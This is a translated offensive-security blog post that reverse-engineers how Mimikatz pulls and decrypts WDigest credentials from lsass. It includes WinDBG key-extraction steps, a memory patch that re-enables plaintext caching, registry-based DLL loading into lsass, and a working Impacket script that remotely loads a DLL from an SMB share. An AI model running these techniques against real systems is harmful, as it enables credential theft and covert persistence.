> 原文链接: https://www.anquanke.com//post/id/180126 


# 深入分析Mimikatz：WDigest


                                阅读量   
                                **287816**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者xpnsec，文章来源：blog.xpnsec.com
                                <br>原文地址：[https://blog.xpnsec.com/exploring-mimikatz-part-1/](https://blog.xpnsec.com/exploring-mimikatz-part-1/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01abe248a20b28bf57.jpg)](https://p5.ssl.qhimg.com/t01abe248a20b28bf57.jpg)



## 0x00 前言

Mimikatz是个非常强大工具，我们曾打包过、封装过、注入过、使用powershell改造过这款工具，现在我们又开始向其输入内存dump数据。不论如何，从Windows系统`lsass`提取凭据时，Mimikatz仍然是首选工具。每当微软引入新的安全控制策略时，[GentilKiwi](https://twitter.com/gentilkiwi)总是能够想出奇招绕过防御，这也是Mimikatz充满活力的原因所在。然而如果大家之前看过Mimikatz的源码，就知道这绝非易事，该工具需要支持x86及x64的所有Windows版本（最近还增加了对ARM架构Windows的支持）。随着Mimikatz的声名远扬，蓝队现在也有各种方式能够检测这款工具。从根本上来讲，如果目标环境中部署了针对性安全机制，那么在目标主机上执行Mimikatz的行为就可能被检测到。

我一直以来都在强调，大家需要理解工具的内部原理，而不是执行脚本这么简单。现在安全厂商一直都在减少并监控常见的攻击技巧及攻击面，并且会比我们发现新方法的速度还要快，因此理解某种技术对底层API的调用能带来不少好处，可能避免我们的行为在重重防护的环境中被检测出来。

在这种情况下，许多后渗透工具集会以各种方式集成Mimikatz这个工具。现在有些安全厂商会检测进程与`lsass`的交互行为，而更多厂商会去努力去识别Mimikatz行为特征。

我一直都想在某些场景下抽离Mimikatz的某些功能（主要是不方便或者不可能转储内存数据的场景），但我却没有好好深入研究这款工具的底层实现，这一点实在有点让人困扰。

因此在过去几篇文章中，我开始探索这款工具的内部实现，主要从WDigest开始研究。我重点关注的是明文凭据如何缓存在`lsass`中，为什么可以使用`sekurlsa::wdigest`来提取这些凭据。这个过程需要反汇编以及调试，并且想达到Mimikatz的高度是非常困难的一件事，但最后我们会发现，如果只是想实现Mimikatz中的一部分功能、基于源代码来构建自己的工具，那么这个过程还是非常值得去尝试。

在本文中，我将探讨在`lsass`中加载任意DLL的其他方法，可以与本文的示例代码结合使用。

> 备注：本文大量用到了Mimikatz源代码，Mimikatz开发人员在这上面花了大量精力。当我们在阅读源码时，会发现其中涉及到许多未公开的结构，感受到开发者的辛苦付出。这里要感谢Mimikatz、[Benjamin Delpy](https://twitter.com/gentilkiwi)以及[Vincent Le Toux](https://twitter.com/mysmartlogon)的杰出工作。



## 0x01 sekurlsa::wdigest

如上所述，在本文中我们将重点关注WDigest，这也是Mimikatz最出名的一个功能。在Windows Server 2008 R2之前，系统默认情况下会缓存WDigest凭据，此后系统不再缓存明文凭据。

在逆向分析系统组件时，我通常喜欢attach调试器，观察组件如何在运行过程中与系统交互。不幸的是，在这种场景下，我们无法简单地将WinDBG附加到`lsass`上，如果这么操作，Windows会停止运行，警告用户系统即将重启。因此，我们需要attach内核，然后从Ring-0切换到`lsass`进程。如果大家之前没有使用WinDBG attach内核，可以阅读我之前的[文章](https://blog.xpnsec.com/windows-warbird-privesc/)，了解如何设置内核调试器。

attach内核调试器后，我们需要抓取`lsass`进程的`EPROCESS`地址，可以使用如下命令`!process 0 0 lsass.exe`：

[![](https://p5.ssl.qhimg.com/t015afdd7b7326a3359.png)](https://p5.ssl.qhimg.com/t015afdd7b7326a3359.png)

确定`EPROCESS`地址后（`ffff9d01325a7080`），我们可以请求将调试会话切换到`lsass`进程的上下文：

[![](https://p1.ssl.qhimg.com/t0184b815e94dfea800.png)](https://p1.ssl.qhimg.com/t0184b815e94dfea800.png)

通过`lm`命令来确定现在我们具备WDigest DLL进程空间的访问权限：

[![](https://p4.ssl.qhimg.com/t016e5d09217c7fcb6d.png)](https://p4.ssl.qhimg.com/t016e5d09217c7fcb6d.png)

如果此时我们发现符号并没有得到正确解析，通常情况下可以尝试`.reload /user`。

attach调试器后，让我们开始深入分析WDigest。



## 0x02 深入分析wdigest.dll（以及lsasrv.dll）

如果观察Mimikatz源代码，可以看到代码通过扫描特征来识别内存中的凭据信息。这里我们可以使用非常有名的[Ghidra](https://ghidra-sre.org/)工具，来看看Mimikatz在搜索哪些特征。

我使用的环境为Windows 10 x64，因此我重点关注`PTRN_WIN6_PasswdSet`特征，如下所示：

[![](https://p5.ssl.qhimg.com/t01c246580e7cc0d87b.png)](https://p5.ssl.qhimg.com/t01c246580e7cc0d87b.png)

在Ghidra中输入这个搜索特征后，我们就能知道Mimikatz在内存中搜索什么：

[![](https://p5.ssl.qhimg.com/t0124576f1c612941ea.png)](https://p5.ssl.qhimg.com/t0124576f1c612941ea.png)

[![](https://p0.ssl.qhimg.com/t014b9096eb264bb7c5.png)](https://p0.ssl.qhimg.com/t014b9096eb264bb7c5.png)

如上图所示，我们找到了`LogSessHandlerPasswdSet`，特别是`l_LogSessList`指针。这个指针是从WDigest中提取凭据的关键，但在进一步分析前，我们可以先备份一下，通过交叉引用查找谁在调用这个函数，我们找到了如下信息：

[![](https://p2.ssl.qhimg.com/t012e4ba14383ce215f.png)](https://p2.ssl.qhimg.com/t012e4ba14383ce215f.png)

这里我们找到了`WDigest.dll`导出的`SpAcceptCredentials`函数，这个函数有什么作用呢？

[![](https://p2.ssl.qhimg.com/t01a9c64173fa2aa9ac.png)](https://p2.ssl.qhimg.com/t01a9c64173fa2aa9ac.png)

这个信息看起来非常有希望，我们可以看到凭据需要通过这个回调函数来传递。我们来确认一下自己的确没有偏离主题。在WinDBG中，我们可以使用`bp wdigest!SpAcceptCredentials`来添加断点，然后在Windows中利用`runas`命令弹出一个shell：

[![](https://p5.ssl.qhimg.com/t01a2cd3561c731f351.png)](https://p5.ssl.qhimg.com/t01a2cd3561c731f351.png)

这些操作应该足以触发断点。检查传给该函数的参数，我们可以看到传入的凭据：

[![](https://p2.ssl.qhimg.com/t018c7c4aa08ccaff02.png)](https://p2.ssl.qhimg.com/t018c7c4aa08ccaff02.png)

如果我们继续执行，在`wdigest!LogSessHandlerPasswdSet`上添加另一个断点，可以发现虽然我们传入了用户名，但并没有看到我们的密码。然而在`LogSessHandlerPasswdSet`函数被调用之前，我们可以看到如下信息：

[![](https://p5.ssl.qhimg.com/t016292c71331e40693.png)](https://p5.ssl.qhimg.com/t016292c71331e40693.png)

这实际上是用于Control Flow Guard的一个桩（stub）函数（[Ghidra 9.0.3](https://github.com/NationalSecurityAgency/ghidra/issues/318)似乎能够较好地显示CFG stub），但如果我们在调试器中跟踪，就会发现系统实际上调用的是`LsaProtectMemory`：

[![](https://p5.ssl.qhimg.com/t0188ccb799260605c3.png)](https://p5.ssl.qhimg.com/t0188ccb799260605c3.png)

这符合我们的预期，因为我们知道凭据会在内存中加密存储。不幸的是，`lsass`并没有对外公开`LsaProtectMemory`，因此我们需要知道如何重构该功能来解密先前提取出的凭据。跟踪反汇编代码，我们发现这个调用实际上是`LsaEncryptMemory`的封装函数：

[![](https://p3.ssl.qhimg.com/t011aa01a68329d4e26.png)](https://p3.ssl.qhimg.com/t011aa01a68329d4e26.png)

而`LsaEncryptMemory`实际上是`BCryptEncrypt`的封装函数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0108e83b766618c7f7.png)

有趣的是，系统会根据待加密的数据块长度来选择加密/解密函数。如果输入的缓冲区长度能被8整除（如上图的`param_2 &amp; 7`），那么就会使用AES算法。如果不满足该条件，则会使用3Des。

现在我们知道我们的密码经过`BCryptEncrypt`加密，但密钥在哪？如果往上翻翻，我们可以看到对`lsasrv!h3DesKey`以及`lsasrv!hAesKey`的引用。跟踪引用地址，我们可以看到`lsasrv!LsaInitializeProtectedMemory`用来给这些变量分配初始值。更具体一点，系统会调用`BCryptGenRandom`来生成密钥：

[![](https://p3.ssl.qhimg.com/t01f7c6064556550722.png)](https://p3.ssl.qhimg.com/t01f7c6064556550722.png)

这意味着每次`lsass`启动时都会生成随机的新密钥，我们需要提取密钥才能解密已缓存的WDigest凭据。

回到Mimikatz源代码，确认一下我们并没有偏离方向。可以看到代码的确会搜索`LsaInitializeProtectedMemory`函数，同时还有一些特征用来区分不同的Windows版本及架构：

[![](https://p0.ssl.qhimg.com/t01da062993bd89cfe6.png)](https://p0.ssl.qhimg.com/t01da062993bd89cfe6.png)

如果我们在Ghidra中搜索这些特征，可以找到如下信息：

[![](https://p4.ssl.qhimg.com/t01e1016e0a877f13f6.png)](https://p4.ssl.qhimg.com/t01e1016e0a877f13f6.png)

这里我们可以看到对`hAesKey`地址的引用。因此，与之前的特征搜索类似，Mimikatz正在内存中寻找加密密钥。

接下来我们需要理解Mimikatz如何将密钥从内存中提取出来。为了完成这个任务，我们需要参考Mimikatz中的`kuhl_m_sekurlsa_nt6_acquireKey`，其中能看到对应不同操作系统版本的长度值。可以看到`hAesKey`以及`h3DesKey`（从`BCryptGenerateSymmetricKey`返回的`BCRYPT_KEY_HANDLE`类型）实际上指向的是内存中的一个结构体，其中包含生成的对称AES密钥以及3DES密钥。我们可以在Mimikatz中找到这个结构：

```
typedef struct _KIWI_BCRYPT_HANDLE_KEY `{`
    ULONG size;
    ULONG tag;    // 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY key;
    PVOID unk0;
`}` KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;
```

可以将这个信息与WinDBG结合起来，检查其中的`UUUR`标签来确认我们没有偏离正轨：

[![](https://p5.ssl.qhimg.com/t0136d25872d754c20c.png)](https://p5.ssl.qhimg.com/t0136d25872d754c20c.png)

在`0x10`偏移处，我们可以看到Mimikatz正在引用`PKIWI_BCRYPT_KEY`，结构如下所示：

```
typedef struct _KIWI_BCRYPT_KEY81 `{`
    ULONG size;
    ULONG tag;    // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2; 
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;    // before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
`}` KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;
```

当然，如果继续跟进，WinDBG也会显示相同的引用标签：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0108b24db1d3cb7e00.png)

这个结构最后一个成员是`KIWI_HARD_KEY`，对应的结构如下：

```
typedef struct _KIWI_HARD_KEY `{`
    ULONG cbSecret;
    BYTE data[ANYSIZE_ARRAY]; // etc...
`}` KIWI_HARD_KEY, *PKIWI_HARD_KEY;
```

这个结构体中包含密钥的大小（`cbSecret`），`data`中包含实际的密钥。这意味着我们可以使用WinDBG来提取这个密钥，如下所示：

[![](https://p3.ssl.qhimg.com/t01984bd458f569b7ff.png)](https://p3.ssl.qhimg.com/t01984bd458f569b7ff.png)

这样我们就得到了`h3DesKey`，大小为`0x18`字节，包含如下数据：

```
b9 a8 b6 10 ee 85 f3 4f d3 cb 50 a6 a4 88 dc 6e ee b3 88 68 32 9a ec 5a
```

我们可以通过相同的过程来提取`hAesKey`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014260a5af8a251fe4.png)

现在我们已经知道密钥的提取过程，我们需要寻找WDigest实际缓存的密钥。让我们回到前面讨论过的`l_LogSessList`指针。这个字段对应的是一个链表，我们可以使用WinDBG命令`!list -x "dq @$extret" poi(wdigest!l_LogSessList)`来遍历链表：

[![](https://p4.ssl.qhimg.com/t01de22992405ab1691.png)](https://p4.ssl.qhimg.com/t01de22992405ab1691.png)

这些表项对应的结构包含如下字段：

```
typedef struct _KIWI_WDIGEST_LIST_ENTRY `{`
    struct _KIWI_WDIGEST_LIST_ENTRY *Flink;
    struct _KIWI_WDIGEST_LIST_ENTRY *Blink;
    ULONG    UsageCount;
    struct _KIWI_WDIGEST_LIST_ENTRY *This;
    LUID LocallyUniqueIdentifier;
`}` KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;
```

在这个结构之后有3个`LSA_UNICODE_STRING`字段，具体偏移如下：
<li>
`0x30` – 用户名</li>
<li>
`0x40` – 主机名</li>
<li>
`0x50` – 加密后的密码</li>
这里我们在WinDBG中使用如下命令来确保我们的研究方向没有问题：

```
!list -x "dS @$extret+0x30" poi(wdigest!l_LogSessList)
```

可以导出已缓存的用户名，如下所示：

[![](https://p0.ssl.qhimg.com/t01c70c00d3a7c5cbbf.png)](https://p0.ssl.qhimg.com/t01c70c00d3a7c5cbbf.png)

最后我们可以使用类似的命令导出已加密的密码：

```
!list -x "db poi(@$extret+0x58)" poi(wdigest!l_LogSessList)
```

[![](https://p1.ssl.qhimg.com/t01bdef094faad9f3e8.png)](https://p1.ssl.qhimg.com/t01bdef094faad9f3e8.png)

到目前为止，我们已经搜集到从内存中提取WDigest凭据的所有拼图。

掌握提取到的数据以及解密流程后，我们是否能将这些元素结合在一起，形成独立于Mimikatz的一款小工具？为了验证这是否可行，我构造了一个[PoC](https://gist.github.com/xpn/e3837a4fdee8ea1b05f7fea5e7ea9444)，其中包含大量注释。在Windows 10 x64（build 1809）上运行时，该工具能输出关于凭据提取的各种提示信息：

[![](https://p5.ssl.qhimg.com/t019bd9f425662658c8.png)](https://p5.ssl.qhimg.com/t019bd9f425662658c8.png)

输出太多信息肯定不利于隐蔽我们的行为，但大家可以以此为例，了解开发定制工具的过程。

现在我们已经澄清如何抓取并解密WDigest已缓存的凭据，我们可以开始研究影响凭据收集的另一个因素：`UseLogonCredential`。



## 0x03 UseLogonCredential

越来越多人想提取明文密码，因此微软决定在默认情况下禁用这种协议。当然，还会有些用户在使用WDigest，因此为了能够重启该协议，微软给出了一个注册表项：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`，将这个值从`0`改成`1`，就可以让WDigest重新开始缓存，这意味着渗透测试人员还是会有用武之地。此外GentiKiwi还提到，修改这个键值并不需要重启才能生效，后面我会讨论这一点。

让我们再来看一下`SpAcceptCredentials`，经过一番搜索后，我们找到如下代码：

[![](https://p1.ssl.qhimg.com/t01ba145e7d33cc5a01.png)](https://p1.ssl.qhimg.com/t01ba145e7d33cc5a01.png)

这里我们可以看到系统在判断条件中使用了两个全局变量。如果`g_IsCredGuardEnabled`为`1`，或者`g_fParameter_UseLogonCredential`为`0`，那么就不会进入`LogSessHandlerPasswdSet`代码路径，而是会进入`LogSessHandlerNoPasswordInsert`代码路径。顾名思义，这个函数会缓存会话而不是密码，这也是我们经常会在Windows 2012上碰到的情况。根据变量名，我们有理由猜测这个变量受前面提到的注册表键值控制，我们可以跟踪变量赋值逻辑来确认这一点：

[![](https://p2.ssl.qhimg.com/t01237a7c51fd54c4b7.png)](https://p2.ssl.qhimg.com/t01237a7c51fd54c4b7.png)

了解`WDigest.dll`中哪个变量会控制凭据缓存后，我们是否可以在不更新注册表的情况下做些变化？如果我们使用调试器，在运行时更新`g_fParameter_UseLogonCredential`参数，会出现什么情况？

[![](https://p5.ssl.qhimg.com/t01ffd5cc1465b7585a.png)](https://p5.ssl.qhimg.com/t01ffd5cc1465b7585a.png)

恢复执行，我们可以看到系统会再次缓存明文凭据：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01de4bf2d64f9420c6.png)

当然，我们都搞定内核调试器了，本来就可以做很多事情。但如果我们可以在不触发AV/EDR的情况下（参考之前我关于[Cylance](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/)的一篇文章）篡改`lsass`内存，那么我们就可以自己构造一个工具来操控这个变量。这里我又创建了包含大量输出的一个[工具](https://gist.github.com/xpn/163360379f3cce2443a7b074f0a173b8)，用来演示整个攻击过程。

这个工具会搜索并更新内存中的`g_fParameter_UseLogonCredential`变量值。如果我们面对的是受Credential Guard保护的系统，那么更新变量值也不是特别难，这部分工作留给大家来完成。

执行PoC后，可以看到WDigest现在已经重新启用，并且无需设置注册表值，这样我们就可以提取出已缓存的凭据：

[![](https://p4.ssl.qhimg.com/t01124223958698d9fc.png)](https://p4.ssl.qhimg.com/t01124223958698d9fc.png)

这个PoC肯定不大适合实际操作环境，但可以作为参考，帮助大家构造属于自己的工具。

当然，启用WDigest的这种方法存在一定风险，主要是需要对`lsass`执行`WriteProcessMemory`操作。但如果目标环境允许，那么这种方法就可以在不需要设置注册表值的情况下启用WDigest。除了WDigest外，还有一些明文凭据提取方法，可能更适用于实际目标环境（比如说`memssp`，参考[这篇文章](https://www.anquanke.com/post/id/180001)）。

前面提到过，根据GentilKiwi的说法，我们不需要重启就可以让`UseLogonCredential`生效。这里让我们再次回到反汇编代码寻找原因。

观察引用这个注册表值的其他位置，我们可以找到`wdigest!DigestWatchParamKey`，这个函数会监控许多键值，包括：

[![](https://p4.ssl.qhimg.com/t01eabdd39452e8e3ff.png)](https://p4.ssl.qhimg.com/t01eabdd39452e8e3ff.png)

用来触发这个函数的Win32 API为[`RegNotifyKeyChangeValue`](https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regnotifychangekeyvalue)：

[![](https://p3.ssl.qhimg.com/t010b6294a84e64f93d.png)](https://p3.ssl.qhimg.com/t010b6294a84e64f93d.png)

在WinDBG中，如果我们在`wdigest!DigestWatchParamKey`上设置断点，可以看到当我们添加`UseLogonCredential`时，就会触发断点：

[![](https://p3.ssl.qhimg.com/t01005442f64e4627a3.png)](https://p3.ssl.qhimg.com/t01005442f64e4627a3.png)



## 0x04 将任意DLL载入LSASS

在使用反汇编工具时，我也在寻找有没有其他方法能够将代码载入`lsass`中（或者加载SSP），避免可能被安防产品hook的Win32 API。经过一些反汇编操作后，我在`lsasrv.dll`中找到如下代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01467497b8fef0ca57.png)

以上代码位于`LsapLoadLsaDbExtensionDll`函数中，会尝试在用户提供的值上调用`LoadLibraryExW`，这样我们就有机会能够构造一个DLL加载到`lsass`进程中，比如：

```
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
`{`
    switch (ul_reason_for_call)
    `{`
    case DLL_PROCESS_ATTACH:
        // Insert l33t payload here
        break;
    `}`

    // Important to avoid BSOD
    return FALSE;
`}`
```

在`DllMain`函数末尾，我们返回`FALSE`，强制`LoadLibraryEx`出现错误，这一点很重要。这样可以避免系统后续调用`GetProcAddress`。如果无法执行该操作，会导致系统重启后出现BSOD，除非我们移除DLL或者注册表键值。

构造出DLL后，我们需要做的就是创建如上注册表键值：

```
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "C:\xpnsec.dll"
```

系统会在重启时加载我们的DLL，因此可以作为高权限驻留技术，将我们的payload直接载入`lsass`中（当然需要PPL没有处于启用状态）。



## 0x05 远程将任意DLL载入LSASS

经过一番搜索后，我又在`samsrv.dll`中找到了类似的攻击方法。这里`LoadLibraryEx`会将我们可控的某个注册表键值载入`lsass`中：

[![](https://p4.ssl.qhimg.com/t011c48a50487c64292.png)](https://p4.ssl.qhimg.com/t011c48a50487c64292.png)

同样，我们会添加一个注册表键值然后重启。然而这种情况下，触发这个代码逻辑要简单得多，我们可以使用SAMR RPC调用来触发。

这里我们可以使用前面的WDigest凭据提取代码来构造一个DLL，帮我们导出明文凭据。

为了加载这个DLL，我们可以使用一个非常简单的Impacket Python脚本来修改注册表，添加一个键值（`HKLM\SYSTEM\CurrentControlSet\Services\NTDS\DirectoryServiceExtPt`），将其指向我们托管在开放式SMB共享的DLL上，然后通过`hSamConnect` RPC调用来触发系统加载DLL。代码如下所示：

```
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt, samr
from impacket.smbconnection import SMBConnection

def trigger_samr(remoteHost, username, password):

    print("[*] Connecting to SAMR RPC service")

    try:
        rpctransport = transport.SMBTransport(remoteHost, 445, r'\samr', username, password, "", "", "", "")
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
    except (Exception) as e:
        print("[x] Error binding to SAMR: %s" % e)
        return

    print("[*] Connection established, triggering SamrConnect to force load the added DLL")

    # Trigger
    samr.hSamrConnect(dce)

    print("[*] Triggered, DLL should have been executed...")

def start(remoteName, remoteHost, username, password, dllPath):

    winreg_bind = r'ncacn_np:445[\pipe\winreg]'
    hRootKey = None
    subkey = None
    rrpclient = None

    print("[*] Connecting to remote registry")

    try:
        rpctransport = transport.SMBTransport(remoteHost, 445, r'\winreg', username, password, "", "", "", "")
    except (Exception) as e:
        print("[x] Error establishing SMB connection: %s" % e)
        return

    try:
        # Set up winreg RPC
        rrpclient = rpctransport.get_dce_rpc()
        rrpclient.connect()
        rrpclient.bind(rrp.MSRPC_UUID_RRP)
    except (Exception) as e:
        print("[x] Error binding to remote registry: %s" % e)
        return

    print("[*] Connection established")
    print("[*] Adding new value to SYSTEM\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPtr")

    try:
        # Add a new registry key
        ans = rrp.hOpenLocalMachine(rrpclient)
        hRootKey = ans['phKey']
        subkey = rrp.hBaseRegOpenKey(rrpclient, hRootKey, "SYSTEM\\CurrentControlSet\\Services\\NTDS")
        rrp.hBaseRegSetValue(rrpclient, subkey["phkResult"], "DirectoryServiceExtPt", 1, dllPath)
    except (Exception) as e:
        print("[x] Error communicating with remote registry: %s" % e)
        return

    print("[*] Registry value created, DLL will be loaded from %s" % (dllPath))

    trigger_samr(remoteHost, username, password)

    print("[*] Removing registry entry")

    try:
        rrp.hBaseRegDeleteValue(rrpclient, subkey["phkResult"], "DirectoryServiceExtPt")
    except (Exception) as e:
        print("[x] Error deleting from remote registry: %s" % e)
        return

    print("[*] All done")

print("LSASS DirectoryServiceExtPt POC\n     @_xpn_\n")




start("192.168.0.111", "192.168.0.111", "test", "wibble", "\\\\opensharehost\\ntds\\legit.dll")
```

我们能成功从内存中提取出明文凭据，大家可以参考完整[操作步骤](https://asciinema.org/a/VwaStfgka8FHmHWhXjmBmu8zV)。

大家可以访问[此处](https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394)下载DLL代码，我们对前文的示例稍微做了些修改。



## 0x06 总结

希望本文能帮大家理解WDigest凭据缓存原理，了解Mimikatz如何通过`sekurlsa::wdigest`命令来提取并解密密码。更重要的是，我希望本文能帮助大家构造自己的工具，方便大家在实际环境中行动。我将继续关注渗透测试中常用的其他工具或技术，大家如果有任何问题或建议，欢迎随时联系我。
